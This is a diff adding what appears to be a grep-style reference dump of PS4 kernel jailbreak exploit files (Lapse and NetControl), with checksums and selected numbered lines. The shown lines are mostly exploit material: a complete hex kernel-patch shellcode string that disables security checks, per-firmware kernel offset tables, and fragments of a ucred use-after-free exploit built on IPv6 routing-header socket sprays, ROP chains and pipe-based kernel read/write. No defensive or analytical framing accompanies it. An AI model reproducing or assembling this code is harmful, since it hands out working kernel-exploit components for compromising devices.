@@ -1,0 +1,858 @@
+===== README.md =====
+cc92dc6ce048622ff067cfe88e5573b326eac4cec5dd3c6e01c8a98cf34519d0  /tmp/netctrl-ref/README.md
+  70 3706 /tmp/netctrl-ref/README.md
+4:* Can be chained with the kernel exploit Lapse up to 12.02 on PS4 only.
+6:* Not compatible with the kernel exploit poopsploit. 
+===== kernel.js =====
+c895da31701a7894d459f37bbed366c77e1d4e7493a83c4aeceae6f51cc91bbf  /tmp/netctrl-ref/kernel.js
+  937 44146 /tmp/netctrl-ref/kernel.js
+1:/***** kernel_offset.js *****/
+3:// PS4 Kernel Offsets for Lapse exploit
+6:// Kernel patch shellcode (hex strings) - patches security checks in kernel
+33:    "13.00": "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981e3761b0041b9eb00000041baeb00000041bbeb000000b890e9ffff4881c2717904006689b1f3761b006689b913771b0066448981847b6200c681cd0a0000ebc6812dd42b00ebc68171d42b00ebc681edd42b00ebc68131d52b00ebc681ddd62b00ebc6818ddb2b00ebc6815ddc2b00eb664489896f846200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c68146153900ebc7814ec12f0000000000668981a4711b00c78158771b0090e93c01c781c0d83b004831c0c3c6817aa71f0037c6817da71f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c031c0c3",
+36:// Mmap RWX patch offsets per firmware (for verification)
+37:// These are the offsets where 0x33 is patched to 0x37
+38:const kpatch_mmap_offsets = {
+59:    // TODO: add mmap offsets for 12.50, 12.52, 13.00
+110:    "13.00": "13.00",
+113:function get_mmap_patch_offsets(fw_version) {
+123:    return kpatch_mmap_offsets[lookup] || null;
+135:// Get kernel patch shellcode for firmware version
+144:// Firmware-specific offsets for PS4
+146:offset_ps4_5_00 = {             // AND 5.01
+147:    EVF_OFFSET: 0X7B3ED4,
+149:    ROOTVNODE: 0X22C19F0,
+150:    SYSENT_661: 0X1084200,
+154:offset_ps4_5_03 = {
+155:    EVF_OFFSET: 0X7B42E4,
+157:    ROOTVNODE: 0X22C1A70,
+158:    SYSENT_661: 0X1084200,
+162:offset_ps4_5_05 = {             // AND 5.07
+163:    EVF_OFFSET: 0X7B42A4,
+165:    ROOTVNODE: 0X22C1A70,
+166:    SYSENT_661: 0X1084200,
+170:offset_ps4_5_50 = {
+171:    EVF_OFFSET: 0X80EF12,
+173:    ROOTVNODE: 0X22EF570,
+174:    SYSENT_661: 0X111D8B0,
+178:offset_ps4_5_53 = {
+179:    EVF_OFFSET: 0X80EDE2,
+181:    ROOTVNODE: 0X22EF570,
+182:    SYSENT_661: 0X111D8B0,
+186:offset_ps4_5_55 = {
+187:    EVF_OFFSET: 0X80F482,
+189:    ROOTVNODE: 0X22F3570,
+190:    SYSENT_661: 0X11228B0,
+194:offset_ps4_5_56 = {
+195:    EVF_OFFSET: 0X7C8971,
+197:    ROOTVNODE: 0X22F3570,
+198:    SYSENT_661: 0X1123130,
+202:offset_ps4_6_00 = {             // AND 6.02
+203:    EVF_OFFSET: 0X7C8971,
+205:    ROOTVNODE: 0X21BFAC0,
+206:    SYSENT_661: 0X1123130,
+210:offset_ps4_6_20 = {
+211:    EVF_OFFSET: 0X7C8E31,
+213:    ROOTVNODE: 0X21C3AC0,
+214:    SYSENT_661: 0X1127130,
+218:offset_ps4_6_50 = {
+219:    EVF_OFFSET: 0X7C6019,
+221:    ROOTVNODE: 0X2300320,
+222:    SYSENT_661: 0X1124BF0,
+226:offset_ps4_6_51 = {
+227:    EVF_OFFSET: 0X7C6099,
+229:    ROOTVNODE: 0X2300320,
+230:    SYSENT_661: 0X1124BF0,
+234:offset_ps4_6_70 = {             // AND 6.71, 6.72
+235:    EVF_OFFSET: 0X7C7829,
+237:    ROOTVNODE: 0X2300320,
+238:    SYSENT_661: 0X1125BF0,
+242:offset_ps4_7_00 = {             // AND 7.01, 7.02
+243:    EVF_OFFSET: 0X7F92CB,
+245:    ROOTVNODE: 0X22C5750,
+246:    SYSENT_661: 0X112D250,
+250:offset_ps4_7_50 = {
+251:    EVF_OFFSET: 0X79A92E,
+253:    ROOTVNODE: 0X1B463E0,
+254:    SYSENT_661: 0X1129F30,
+258:offset_ps4_7_51 = {             // AND 7.55
+259:    EVF_OFFSET: 0X79A96E,
+261:    ROOTVNODE: 0X1B463E0,
+262:    SYSENT_661: 0X1129F30,
+266:offset_ps4_8_00 = {             // AND 8.01, 8.02, 8.03
+267:    EVF_OFFSET: 0X7EDCFF,
+269:    ROOTVNODE: 0X1B8C730,
+270:    SYSENT_661: 0X11040C0,
+274:offset_ps4_8_50 = {             // AND 8.52
+275:    EVF_OFFSET: 0X7DA91C,
+277:    ROOTVNODE: 0X1C66150,
+278:    SYSENT_661: 0X11041B0,
+282:offset_ps4_9_00 = {
+283:    EVF_OFFSET: 0x7F6F27,
+285:    ROOTVNODE: 0x21EFF20,
+286:    TARGET_ID_OFFSET: 0x221688D,
+287:    SYSENT_661: 0x1107F00,
+293:offset_ps4_9_03 = {
+294:    EVF_OFFSET: 0x7F4CE7,
+296:    ROOTVNODE: 0x21EBF20,
+297:    TARGET_ID_OFFSET: 0x221288D,
+298:    SYSENT_661: 0x1103F00,
+303:offset_ps4_9_50 = {
+304:    EVF_OFFSET: 0x769A88,
+306:    ROOTVNODE: 0x21A6C30,
+307:    TARGET_ID_OFFSET: 0x221A40D,
+308:    SYSENT_661: 0x1100EE0,
+313:offset_ps4_10_00 = {
+314:    EVF_OFFSET: 0x7B5133,
+316:    ROOTVNODE: 0x1B25BD0,
+317:    TARGET_ID_OFFSET: 0x1B9E08D,
+318:    SYSENT_661: 0x110A980,
+323:offset_ps4_10_50 = {
+324:    EVF_OFFSET: 0x7A7B14,
+326:    ROOTVNODE: 0x1BF81F0,
+327:    TARGET_ID_OFFSET: 0x1BE460D,
+328:    SYSENT_661: 0x110A5B0,
+333:offset_ps4_11_00 = {
+334:    EVF_OFFSET: 0x7FC26F,
+336:    ROOTVNODE: 0x2116640,
+337:    TARGET_ID_OFFSET: 0x221C60D,
+338:    SYSENT_661: 0x1109350,
+343:offset_ps4_11_02 = {
+344:    EVF_OFFSET: 0x7FC22F,
+346:    ROOTVNODE: 0x2116640,
+347:    TARGET_ID_OFFSET: 0x221C60D,
+348:    SYSENT_661: 0x1109350,
+353:offset_ps4_11_50 = {
+354:    EVF_OFFSET: 0x784318,
+356:    ROOTVNODE: 0x2136E90,
+357:    TARGET_ID_OFFSET: 0x21CC60D,
+358:    SYSENT_661: 0x110A760,
+363:offset_ps4_12_00 = {            // AND 12.02
+364:    EVF_OFFSET: 0x784798,
+366:    ROOTVNODE: 0x2136E90,
+367:    TARGET_ID_OFFSET: 0x21CC60D,
+368:    SYSENT_661: 0x110A760,
+373:offset_ps4_12_50 = {        // AND 12.52, 13.00
+374:    EVF_OFFSET: 0x0,        // Missing but not needed in netctrl
+376:    ROOTVNODE: 0x2136E90,
+377:    TARGET_ID_OFFSET: 0x0,  // Missing but not needed in netctrl
+378:    SYSENT_661: 0x110A760,
+383:// Map firmware versions to offset objects
+384:ps4_kernel_offset_list = {
+385:    "5.00": offset_ps4_5_00,
+386:    "5.01": offset_ps4_5_00,
+387:    "5.03": offset_ps4_5_03,
+388:    "5.05": offset_ps4_5_05,
+389:    "5.07": offset_ps4_5_05,
+390:    "5.50": offset_ps4_5_50,
+391:    "5.53": offset_ps4_5_53,
+392:    "5.55": offset_ps4_5_55,
+393:    "5.56": offset_ps4_5_56,
+394:    "6.00": offset_ps4_6_00,
+395:    "6.02": offset_ps4_6_00,
+396:    "6.20": offset_ps4_6_20,
+397:    "6.50": offset_ps4_6_50,
+398:    "6.51": offset_ps4_6_51,
+399:    "6.70": offset_ps4_6_70,
+400:    "6.71": offset_ps4_6_70,
+401:    "6.72": offset_ps4_6_70,
+402:    "7.00": offset_ps4_7_00,
+403:    "7.01": offset_ps4_7_00,
+404:    "7.02": offset_ps4_7_00,
+405:    "7.50": offset_ps4_7_50,
+406:    "7.51": offset_ps4_7_51,
+407:    "7.55": offset_ps4_7_51,
+408:    "8.00": offset_ps4_8_00,
+409:    "8.01": offset_ps4_8_00,
+410:    "8.02": offset_ps4_8_00,
+411:    "8.03": offset_ps4_8_00,
+412:    "8.50": offset_ps4_8_50,
+413:    "8.52": offset_ps4_8_50,
+414:    "9.00": offset_ps4_9_00,
+415:    "9.03": offset_ps4_9_03,
+416:    "9.04": offset_ps4_9_03,
+417:    "9.50": offset_ps4_9_50,
+418:    "9.51": offset_ps4_9_50,
+419:    "9.60": offset_ps4_9_50,
+420:    "10.00": offset_ps4_10_00,
+421:    "10.01": offset_ps4_10_00,
+422:    "10.50": offset_ps4_10_50,
+423:    "10.70": offset_ps4_10_50,
+424:    "10.71": offset_ps4_10_50,
+425:    "11.00": offset_ps4_11_00,
+426:    "11.02": offset_ps4_11_02,
+427:    "11.50": offset_ps4_11_50,
+428:    "11.52": offset_ps4_11_50,
+429:    "12.00": offset_ps4_12_00,
+430:    "12.02": offset_ps4_12_00,
+431:    "12.50": offset_ps4_12_50,
+===== lapse.js =====
+d420a1d94a5ab0a9f8e3800b92dcdb6393401b55d27073924d0fbc58925774d3  /tmp/netctrl-ref/lapse.js
+  2942 111223 /tmp/netctrl-ref/lapse.js
+1:/***** kernel_offset.js *****/
+3:// PS4 Kernel Offsets for Lapse exploit
+6:// Kernel patch shellcode (hex strings) - patches security checks in kernel
+34:// Mmap RWX patch offsets per firmware (for verification)
+35:// These are the offsets where 0x33 is patched to 0x37
+36:const kpatch_mmap_offsets = {
+107:function get_mmap_patch_offsets(fw_version) {
+117:    return kpatch_mmap_offsets[lookup] || null;
+129:// Get kernel patch shellcode for firmware version
+138:// Firmware-specific offsets for PS4
+140:offset_ps4_5_00 = {             // AND 5.01
+141:    EVF_OFFSET: 0X7B3ED4,
+143:    ROOTVNODE: 0X22C19F0,
+144:    SYSENT_661: 0X1084200,
+148:offset_ps4_5_03 = {
+149:    EVF_OFFSET: 0X7B42E4,
+151:    ROOTVNODE: 0X22C1A70,
+152:    SYSENT_661: 0X1084200,
+156:offset_ps4_5_05 = {             // AND 5.07
+157:    EVF_OFFSET: 0X7B42A4,
+159:    ROOTVNODE: 0X22C1A70,
+160:    SYSENT_661: 0X1084200,
+164:offset_ps4_5_50 = {
+165:    EVF_OFFSET: 0X80EF12,
+167:    ROOTVNODE: 0X22EF570,
+168:    SYSENT_661: 0X111D8B0,
+172:offset_ps4_5_53 = {
+173:    EVF_OFFSET: 0X80EDE2,
+175:    ROOTVNODE: 0X22EF570,
+176:    SYSENT_661: 0X111D8B0,
+180:offset_ps4_5_55 = {
+181:    EVF_OFFSET: 0X80F482,
+183:    ROOTVNODE: 0X22F3570,
+184:    SYSENT_661: 0X11228B0,
+188:offset_ps4_5_56 = {
+189:    EVF_OFFSET: 0X7C8971,
+191:    ROOTVNODE: 0X22F3570,
+192:    SYSENT_661: 0X1123130,
+196:offset_ps4_6_00 = {             // AND 6.02
+197:    EVF_OFFSET: 0X7C8971,
+199:    ROOTVNODE: 0X21BFAC0,
+200:    SYSENT_661: 0X1123130,
+204:offset_ps4_6_20 = {
+205:    EVF_OFFSET: 0X7C8E31,
+207:    ROOTVNODE: 0X21C3AC0,
+208:    SYSENT_661: 0X1127130,
+212:offset_ps4_6_50 = {
+213:    EVF_OFFSET: 0X7C6019,
+215:    ROOTVNODE: 0X2300320,
+216:    SYSENT_661: 0X1124BF0,
+220:offset_ps4_6_51 = {
+221:    EVF_OFFSET: 0X7C6099,
+223:    ROOTVNODE: 0X2300320,
+224:    SYSENT_661: 0X1124BF0,
+228:offset_ps4_6_70 = {             // AND 6.71, 6.72
+229:    EVF_OFFSET: 0X7C7829,
+231:    ROOTVNODE: 0X2300320,
+232:    SYSENT_661: 0X1125BF0,
+236:offset_ps4_7_00 = {             // AND 7.01, 7.02
+237:    EVF_OFFSET: 0X7F92CB,
+239:    ROOTVNODE: 0X22C5750,
+240:    SYSENT_661: 0X112D250,
+244:offset_ps4_7_50 = {
+245:    EVF_OFFSET: 0X79A92E,
+247:    ROOTVNODE: 0X1B463E0,
+248:    SYSENT_661: 0X1129F30,
+252:offset_ps4_7_51 = {             // AND 7.55
+253:    EVF_OFFSET: 0X79A96E,
+255:    ROOTVNODE: 0X1B463E0,
+256:    SYSENT_661: 0X1129F30,
+260:offset_ps4_8_00 = {             // AND 8.01, 8.02, 8.03
+261:    EVF_OFFSET: 0X7EDCFF,
+263:    ROOTVNODE: 0X1B8C730,
+264:    SYSENT_661: 0X11040C0,
+268:offset_ps4_8_50 = {             // AND 8.52
+269:    EVF_OFFSET: 0X7DA91C,
+271:    ROOTVNODE: 0X1C66150,
+272:    SYSENT_661: 0X11041B0,
+276:offset_ps4_9_00 = {
+277:    EVF_OFFSET: 0x7F6F27,
+279:    ROOTVNODE: 0x21EFF20,
+280:    TARGET_ID_OFFSET: 0x221688D,
+281:    SYSENT_661: 0x1107F00,
+285:offset_ps4_9_03 = {
+286:    EVF_OFFSET: 0x7F4CE7,
+288:    ROOTVNODE: 0x21EBF20,
+289:    TARGET_ID_OFFSET: 0x221288D,
+290:    SYSENT_661: 0x1103F00,
+294:offset_ps4_9_50 = {
+295:    EVF_OFFSET: 0x769A88,
+297:    ROOTVNODE: 0x21A6C30,
+298:    TARGET_ID_OFFSET: 0x221A40D,
+299:    SYSENT_661: 0x1100EE0,
+303:offset_ps4_10_00 = {
+304:    EVF_OFFSET: 0x7B5133,
+306:    ROOTVNODE: 0x1B25BD0,
+307:    TARGET_ID_OFFSET: 0x1B9E08D,
+308:    SYSENT_661: 0x110A980,
+312:offset_ps4_10_50 = {
+313:    EVF_OFFSET: 0x7A7B14,
+315:    ROOTVNODE: 0x1BF81F0,
+316:    TARGET_ID_OFFSET: 0x1BE460D,
+317:    SYSENT_661: 0x110A5B0,
+321:offset_ps4_11_00 = {
+322:    EVF_OFFSET: 0x7FC26F,
+324:    ROOTVNODE: 0x2116640,
+325:    TARGET_ID_OFFSET: 0x221C60D,
+326:    SYSENT_661: 0x1109350,
+330:offset_ps4_11_02 = {
+331:    EVF_OFFSET: 0x7FC22F,
+333:    ROOTVNODE: 0x2116640,
+334:    TARGET_ID_OFFSET: 0x221C60D,
+335:    SYSENT_661: 0x1109350,
+339:offset_ps4_11_50 = {
+340:    EVF_OFFSET: 0x784318,
+342:    ROOTVNODE: 0x2136E90,
+343:    TARGET_ID_OFFSET: 0x21CC60D,
+344:    SYSENT_661: 0x110A760,
+348:offset_ps4_12_00 = {
+349:    EVF_OFFSET: 0x784798,
+351:    ROOTVNODE: 0x2136E90,
+352:    TARGET_ID_OFFSET: 0x21CC60D,
+353:    SYSENT_661: 0x110A760,
+357:// Map firmware versions to offset objects
+358:ps4_kernel_offset_list = {
+359:    "5.00": offset_ps4_5_00,
+360:    "5.01": offset_ps4_5_00,
+361:    "5.03": offset_ps4_5_03,
+362:    "5.05": offset_ps4_5_05,
+363:    "5.07": offset_ps4_5_05,
+364:    "5.50": offset_ps4_5_50,
+365:    "5.53": offset_ps4_5_53,
+366:    "5.55": offset_ps4_5_55,
+367:    "5.56": offset_ps4_5_56,
+368:    "6.00": offset_ps4_6_00,
+369:    "6.02": offset_ps4_6_00,
+370:    "6.20": offset_ps4_6_20,
+371:    "6.50": offset_ps4_6_50,
+372:    "6.51": offset_ps4_6_51,
+373:    "6.70": offset_ps4_6_70,
+374:    "6.71": offset_ps4_6_70,
+375:    "6.72": offset_ps4_6_70,
+376:    "7.00": offset_ps4_7_00,
+377:    "7.01": offset_ps4_7_00,
+378:    "7.02": offset_ps4_7_00,
+379:    "7.50": offset_ps4_7_50,
+380:    "7.51": offset_ps4_7_51,
+381:    "7.55": offset_ps4_7_51,
+382:    "8.00": offset_ps4_8_00,
+383:    "8.01": offset_ps4_8_00,
+384:    "8.02": offset_ps4_8_00,
+385:    "8.03": offset_ps4_8_00,
+386:    "8.50": offset_ps4_8_50,
+387:    "8.52": offset_ps4_8_50,
+388:    "9.00": offset_ps4_9_00,
+389:    "9.03": offset_ps4_9_03,
+390:    "9.04": offset_ps4_9_03,
+391:    "9.50": offset_ps4_9_50,
+392:    "9.51": offset_ps4_9_50,
+393:    "9.60": offset_ps4_9_50,
+394:    "10.00": offset_ps4_10_00,
+395:    "10.01": offset_ps4_10_00,
+396:    "10.50": offset_ps4_10_50,
+397:    "10.70": offset_ps4_10_50,
+398:    "10.71": offset_ps4_10_50,
+399:    "11.00": offset_ps4_11_00,
+400:    "11.02": offset_ps4_11_02,
+401:    "11.50": offset_ps4_11_50,
+402:    "11.52": offset_ps4_11_50,
+403:    "12.00": offset_ps4_12_00,
+404:    "12.02": offset_ps4_12_00,
+407:kernel_offset = null;
+409:function get_kernel_offset(FW_VERSION) {
+410:    const fw_offsets = ps4_kernel_offset_list[FW_VERSION];
+412:    if (!fw_offsets) {
+416:    kernel_offset = fw_offsets;
+418:    // PS4-specific proc structure offsets
+419:    kernel_offset.PROC_FD = 0x48;
+420:    kernel_offset.PROC_PID = 0xB0;       // PS4 = 0xB0, PS5 = 0xBC
+421:    kernel_offset.PROC_VM_SPACE = 0x200;
+===== netctrl.js =====
+7514fda6574207f869292c11d52ffe0aca894c7554eaa0182aa2d41273366b8d  /tmp/netctrl-ref/netctrl.js
+ 1238 45927 /tmp/netctrl-ref/netctrl.js
+3:// NetControl Kernel Exploit (NetControl port based on TheFl0w's Java impl)
+10:// Socket constants (FreeBSD)
+14:var IPPROTO_IPV6 = 41
+16:// IPv6 socket option constants
+17:var IPV6_RTHDR = 51
+18:var IPV6_RTHDR_TYPE_0 = 0
+21:var UCRED_SIZE = 0x168
+25:var IPV6_SOCK_NUM = 128  // Matching Poops.java
+45:  { num: 0x61, name: 'socket' },
+49:  { num: 0x87, name: 'socketpair' }
+65:// STAGE 1: Setup - Create IPv6 sockets and initialize pktopts
+71:fn.register(0x61, 'socket', 'bigint')
+72:fn.register(0x87, 'socketpair', 'bigint')
+81:// should call the libkernel wrapper automatically
+99:var socket = fn.socket
+100:var socketpair = fn.socketpair
+129:var rthdr_buf = mem.malloc(UCRED_SIZE)
+135:// Storage for IPv6 sockets
+136:var ipv6_sockets = new Int32Array(IPV6_SOCK_NUM)
+137:var socket_count = 0
+139:log('Creating ' + IPV6_SOCK_NUM + ' IPv6 sockets...')
+141:// Create IPv6 sockets using socket()
+142:// Note: socket() auto-throws on error in new API, no need for manual checks
+143:for (var i = 0; i < IPV6_SOCK_NUM; i++) {
+144:  var fd = socket(AF_INET6, SOCK_STREAM, 0)
+147:  ipv6_sockets[i] = (fd instanceof BigInt) ? fd.lo : fd
+148:  socket_count++
+151:log('Created ' + socket_count + ' IPv6 sockets')
+153:if (socket_count !== IPV6_SOCK_NUM) {
+154:  log('FAILED: Not all sockets created')
+155:  throw new Error('Failed to create all sockets')
+158:log('Initializing pktopts on all sockets...')
+162:for (var i = 0; i < IPV6_SOCK_NUM; i++) {
+163:  setsockopt(ipv6_sockets[i], IPPROTO_IPV6, IPV6_RTHDR, 0, 0)
+166:log('Initialized ' + IPV6_SOCK_NUM + ' pktopts')
+168:// Build IPv6 routing header template
+170:var rthdr_len = ((UCRED_SIZE >> 3) - 1) & ~1
+173:mem.view(rthdr_buf).setUint8(2, IPV6_RTHDR_TYPE_0) // ip6r_type
+180:// STAGE 2: Trigger ucred triple-free and find twins/triplet
+186:var leak_rthdr_buf = mem.malloc(UCRED_SIZE)
+195:// Try socketpair using fn.register() approach
+196:log('Attempting socketpair...')
+199:log('Allocated socketpair buffer at: ' + sp_buf.toString())
+201:socketpair(1, 1, 0, sp_buf)
+207:log('Created socketpair: [' + iov_ss0 + ', ' + iov_ss1 + ']')
+209:// Prepare msg_iov buffer - use valid addresses, kernel will allocate IOV
+213:  // Point to valid buffer (kernel will allocate IOV structures with iov_base pointing here)
+228:// Prepare IOV for kernel corruption (iov_base=1 will be interpreted as cr_refcnt)
+278:// Store socket FDs in native memory for ROP access
+279:var ipv6_sockets_buf = mem.malloc(IPV6_SOCK_NUM * 4)  // 4 bytes per int32
+280:for (var i = 0; i < IPV6_SOCK_NUM; i++) {
+281:  mem.view(ipv6_sockets_buf).setUint32(i * 4, ipv6_sockets[i], true)
+283:log('IPv6 socket FDs stored at: ' + ipv6_sockets_buf.toString())
+290:  // Control socketpair for signaling this worker
+292:  socketpair(1, 1, 0, ctrl_sp_buf)
+352:socketpair(1, 1, 0, twin_ctrl_sp)
+362:twin_worker.rop_stack_size = 0x40000  // 256KB (10 passes × 128 sockets)
+364:twin_worker.leak_buf = mem.malloc(UCRED_SIZE)
+385:  // Control socketpair for signaling this worker
+387:  socketpair(1, 1, 0, ctrl_sp_buf)
+401:  worker.leak_buf = mem.malloc(UCRED_SIZE)
+466:  // Allocate buffer array for all socket data (128 sockets × 8 bytes each)
+467:  var socket_data_array = mem.malloc(IPV6_SOCK_NUM * 8)
+474:  var ROP_SPRAY_PASSES = 10  // Reduced to prevent kernel panic
+476:    // Spray all 128 sockets
+477:    for (var i = 0; i < IPV6_SOCK_NUM; i++) {
+479:      rop.push(new BigInt(0, ipv6_sockets[i]))
+481:      rop.push(new BigInt(0, IPPROTO_IPV6))
+483:      rop.push(new BigInt(0, IPV6_RTHDR))
+492:  // After spraying, read all sockets into buffer array
+493:  for (var i = 0; i < IPV6_SOCK_NUM; i++) {
+495:    rop.push(new BigInt(0, ipv6_sockets[i]))
+497:    rop.push(new BigInt(0, IPPROTO_IPV6))
+499:    rop.push(new BigInt(0, IPV6_RTHDR))
+501:    rop.push(socket_data_array.add(new BigInt(0, i * 8)))  // Offset for socket i
+521:  // Return both ROP chain and socket data buffer
+524:    socket_data_array: socket_data_array
+562:    // Each pass sprays all 128 sockets
+563:    for (var i = 0; i < IPV6_SOCK_NUM; i++) {
+564:      var sock_fd = ipv6_sockets[i]
+566:      rop.push(new BigInt(0, sock_fd))  // socket FD
+568:      rop.push(new BigInt(0, IPPROTO_IPV6))  // level = 41
+570:      rop.push(new BigInt(0, IPV6_RTHDR))  // optname = 51
+577:    // Small yield between passes to let kernel process
+628:  var loop_start_offset = setup_gadgets * 8
+629:  var loop_start_rsp = rop_stack_top.sub(new BigInt(0, loop_start_offset))
+642:  // Allocates IOV in kernel, blocks until data arrives
+761:  twin_worker.socket_data_array = result.socket_data_array  // Store for later JavaScript access
+814:mem.view(main_rtp).setUint16(0, RTP_PRIO_REALTIME, true)  // offset 0x00: type = 2
+815:mem.view(main_rtp).setUint16(2, 256, true)                 // offset 0x02: prio = 256
+841:  // wake worker with iov socketpair
+894:// Trigger ucred UAF setup with restart on twin failure
+909:  var dummy_sock_result = socket(AF_UNIX, SOCK_STREAM, 0)
+918:  var uaf_sock_result = socket(AF_UNIX, SOCK_STREAM, 0)
+920:  log('uaf socket: ' + uaf_sock)
+933:  // double free the ucred
+942:  log('ucred double-freed, searching for twins...')
+950:      // tag and spray all sockets
+951:      for (var i = 0; i < IPV6_SOCK_NUM; i++) {
+953:        setsockopt(ipv6_sockets[i], IPPROTO_IPV6, IPV6_RTHDR, rthdr_buf, rthdr_size)
+959:      for (var i = 0; i < IPV6_SOCK_NUM; i++) {
+961:        getsockopt(ipv6_sockets[i], IPPROTO_IPV6, IPV6_RTHDR, leak_buf, check_len_buf)
+965:        if ((val & 0xFFFF0000) === RTHDR_TAG && i !== j && j < IPV6_SOCK_NUM) {
+969:          log('twins found: sockets ' + i + ' and ' + j)
+999:      // close uaf socket
+1009:      // close all ipv6 sockets (worker threads stay alive)
+1010:      for (var i = 0; i < IPV6_SOCK_NUM; i++) {
+1012:          if (typeof ipv6_sockets[i] !== 'undefined' && ipv6_sockets[i] >= 0) {
+1013:            close_sys(ipv6_sockets[i])
+1020:      // recreate fresh sockets
+1021:      for (var i = 0; i < IPV6_SOCK_NUM; i++) {
+1023:          var fd = socket(AF_INET6, SOCK_STREAM, 0)
+1024:          ipv6_sockets[i] = (fd instanceof BigInt) ? fd.lo : fd
+1026:          log('error creating socket ' + i)
+1031:      for (var i = 0; i < IPV6_SOCK_NUM; i++) {
+1033:          if (typeof ipv6_sockets[i] !== 'undefined' && ipv6_sockets[i] >= 0) {
+1034:            setsockopt(ipv6_sockets[i], IPPROTO_IPV6, IPV6_RTHDR, 0, 0)
+1039:      // let kernel cleanup
+1051:    log('twin sockets: [' + twins[0] + ', ' + twins[1] + ']')
+1054:    setsockopt(ipv6_sockets[twins[1]], IPPROTO_IPV6, IPV6_RTHDR, 0, 0)
+1076:        getsockopt(ipv6_sockets[twins[0]], IPPROTO_IPV6, IPV6_RTHDR, leak_rthdr_buf, leak_len_buf)
+1115:          for (var i = 0; i < IPV6_SOCK_NUM; i++) {
+1120:            setsockopt(ipv6_sockets[i], IPPROTO_IPV6, IPV6_RTHDR, rthdr_buf, rthdr_size)
+1124:          for (var i = 0; i < IPV6_SOCK_NUM; i++) {
+1129:            mem.view(leak_len_buf).setUint32(0, UCRED_SIZE, true)
+1130:            getsockopt(ipv6_sockets[master], IPPROTO_IPV6, IPV6_RTHDR, leak_rthdr_buf, leak_len_buf)
+1164:      setsockopt(ipv6_sockets[triplets[1]], IPPROTO_IPV6, IPV6_RTHDR, 0, 0)
+1181:  getsockopt(ipv6_sockets[triplets[0]], IPPROTO_IPV6, IPV6_RTHDR, leak_rthdr_buf, leak_len_buf)
+1183:  // Check for kqueue signature at offset 0x08
+1186:    // Found kqueue! Extract kq_fdp at offset 0xA8
+1211:log('Found new triplet[1]: socket[' + triplets[1] + ']')
+1233:// STAGE 5: Kernel R/W primitives via pipe corruption
+===== netctrl_c0w.js =====
+64d2f4668ab999bc1734c9eb7b9919c310fba69027ea3bd0c74bf1e020bc7fb9  /tmp/netctrl-ref/netctrl_c0w.js
+ 1919 60175 /tmp/netctrl-ref/netctrl_c0w.js
+74:var socket              = fn.register(0x61,  'socket',             'bigint');
+75:var socketpair          = fn.register(0x87,  'socketpair',         'bigint');
+111:KERNEL_PID = 0;
+125:IPPROTO_IPV6 = 41;
+128:SOL_SOCKET = 0xffff;
+130:IPV6_RTHDR = 51;
+131:IPV6_RTHDR_TYPE_0 = 0;
+148:UCRED_SIZE = 0x168;
+155:IPV6_SOCK_NUM = 64;
+179:var ipv6_socks = new Array(IPV6_SOCK_NUM);
+181:var spray_rthdr = malloc(UCRED_SIZE);
+183:var leak_rthdr = malloc(UCRED_SIZE);
+186:// Allocate buffer for ipv6_sockets magic spray
+187:var spray_rthdr_rop = malloc(IPV6_SOCK_NUM * UCRED_SIZE);
+188:// Allocate buffer array for all socket data (X sockets × 8 bytes each)
+189:var read_rthdr_rop = malloc(IPV6_SOCK_NUM * 8);
+214:var spray_ipv6_ready = malloc(8);
+215:var spray_ipv6_done = malloc(8);
+216:var spray_ipv6_signal_buf = malloc(8);
+217:var spray_ipv6_stack = malloc(0x2000);
+218:var spray_ipv6_triplet_stack = malloc(0x2000);
+223:var spray_ipv6_worker;
+252:        write8(buf.add(0x02), IPV6_RTHDR_TYPE_0);   // ip6r_type
+282:    return set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
+289:    return get_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, max_len);
+298:            set_sockopt(sds[i], IPPROTO_IPV6, IPV6_RTHDR, 0, 0);
+304:    set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, 0, 0);
+356:        // Socket pair to signal "run"
+357:        socketpair(AF_UNIX, SOCK_STREAM, 0, sock_buf);
+382:        // Socket pair to signal "run"
+383:        socketpair(AF_UNIX, SOCK_STREAM, 0, sock_buf);
+408:        // Socket pair to signal "run"
+409:        socketpair(AF_UNIX, SOCK_STREAM, 0, sock_buf);
+426:    // Create worker for spray and read magic in ipv6_sockets
+430:    var ready = spray_ipv6_ready;
+431:    var done = spray_ipv6_done;
+432:    var signal_buf = spray_ipv6_signal_buf;
+434:    // Socket pair to signal "run"
+435:    socketpair(AF_UNIX, SOCK_STREAM, 0, sock_buf);
+439:    var ret = ipv6_sock_spray_and_read_rop(ready, pipe_0, done, signal_buf);
+449:    spray_ipv6_worker = worker;         // --> Worker data
+532:function trigger_ipv6_spray_and_read() {
+537:    write64(spray_ipv6_worker.done, 0);
+539:    // Spawn ipv6_sockets spray and read worker
+541:    ret = spawn_thread(spray_ipv6_worker.rop, spray_ipv6_worker.loop_size, spray_ipv6_stack); 
+543:        throw new Error("Could not spray_ipv6_worker");
+546:    spray_ipv6_worker.thread_id = thread_id;        // Save thread ID
+549:    ret = write(spray_ipv6_worker.pipe_1, spray_ipv6_worker.signal_buf, 1); 
+551:        throw new Error("Could not signal 'run' spray_ipv6_worker");
+555:function wait_ipv6_spray_and_read() {
+557:    wait_for(spray_ipv6_worker.done, 1)
+619:    spray_rthdr_len = build_rthdr(spray_rthdr, UCRED_SIZE);
+622:    // Fill spray_rthdr_rop for ipv6_sockets spray
+623:    for(i=0; i<IPV6_SOCK_NUM; i++) {
+624:        build_rthdr(spray_rthdr_rop.add(i*UCRED_SIZE), UCRED_SIZE);
+626:        write32(spray_rthdr_rop.add(i*UCRED_SIZE+0x04), RTHDR_TAG | i);
+639:    // Create socket pair for uio spraying.
+640:    socketpair(AF_UNIX, SOCK_STREAM, 0, uio_sock);
+644:    // Create socket pair for iov spraying.
+645:    socketpair(AF_UNIX, SOCK_STREAM, 0, iov_sock);
+649:    // Set up sockets for spraying.
+650:    for (var i = 0; i < ipv6_socks.length; i++) {
+651:      ipv6_socks[i] = socket(AF_INET6, SOCK_STREAM, 0);
+655:    free_rthdrs(ipv6_socks);
+657:    // Create pipes for arbitrary kernel r/w
+682:    for (var i = 0; i < ipv6_socks.length; i++) {
+683:        close(ipv6_socks[i]);
